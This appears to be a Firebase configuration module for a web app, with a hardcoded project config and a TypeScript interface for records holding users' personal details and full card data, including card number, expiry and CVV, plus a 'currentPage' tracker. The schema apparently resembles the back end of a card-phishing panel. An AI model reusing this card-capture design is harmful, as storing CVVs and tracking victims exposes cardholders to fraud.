import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyBzftpB6LUJUBNvQ12y979F8GM4NiZKItY",
  authDomain: "zzaassff-lll.firebaseapp.com",
  databaseURL: "https://zzaassff-lll-default-rtdb.firebaseio.com",
  projectId: "zzaassff-lll",
  storageBucket: "zzaassff-lll.firebasestorage.app",
  messagingSenderId: "1097233727284",
  appId: "1:1097233727284:web:2a8c238e7ca54dfcec2f61",
  measurementId: "G-CZNF1LL514"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}




